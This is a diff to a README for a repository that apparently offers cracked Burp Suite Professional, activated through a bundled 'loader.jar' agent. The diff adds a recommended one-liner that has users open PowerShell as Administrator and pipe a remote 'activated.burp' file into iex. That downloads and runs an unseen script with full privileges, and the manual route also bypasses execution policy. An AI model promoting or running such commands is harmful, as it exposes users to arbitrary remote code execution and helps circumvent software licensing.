@@ -8,24 +8,41 @@ This repository contains Burp Suite Professional setup files for Windows.
 - PowerShell
 - Internet connection (for downloading Java and Burp Suite)
 
-## Quick Start
+## Quick Install (One-Liner) - Recommended
 
-### Option 1: Latest Version (Recommended)
+Open **PowerShell as Administrator** and run:
+
+```powershell
+irm https://raw.githubusercontent.com/ZenVim/BurpSuitePro/refs/heads/main/BurpSuitePro-Latest/activated.burp | iex
+```
+
+Or if the above is blocked:
+```powershell
+iex (irm https://raw.githubusercontent.com/ZenVim/BurpSuitePro/refs/heads/main/BurpSuitePro-Latest/activated.burp)
+```
+
+This single command will automatically:
+- Download the latest repository files
+- Install JDK-21 and JRE-8
+- Download Burp Suite Professional
+- Set up launcher scripts and shortcuts
+- Launch the activation process
+
+## Manual Installation
+
+### Option 1: Latest Version
 
 Navigate to the `BurpSuitePro-Latest` folder and run the installation script:
-
-- Open `Powershell` as administrator and execute below command.
 
 ```powershell
 cd BurpSuitePro-Latest
 Set-ExecutionPolicy -ExecutionPolicy bypass -Scope process
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 .\Install.ps1
 ```
 
 The script will automatically:
-- Download and install JDK-21 (if not already installed)
-- Download and install JRE-8 (if not already installed)
+- Download and install JDK-21
+- Download and install JRE-8
 - Download the latest Burp Suite Professional version
 - Set up launcher scripts and shortcuts
 - Handle activation
@@ -45,6 +62,7 @@ If you prefer the older 1.7.37 version, use the files in `BurpSuitePro-1.7.37/`.
 ```
 BurpSuitePro/
 ├── BurpSuitePro-Latest/          # Latest version setup files
+│   ├── activated.burp            # One-liner auto-installer script
 │   ├── Install.ps1               # Main installation script
 │   ├── loader.jar                # Java agent for activation
 │   ├── icon64pro.ico             # Application icon
@@ -64,7 +82,5 @@ BurpSuitePro/
 
 - Original project: https://github.com/xiv3r/Burpsuite-Professional
 - PortSwigger: https://portswigger.net/burp
-
----
 
 **Note**: This tool is intended for educational and authorized security testing purposes only.
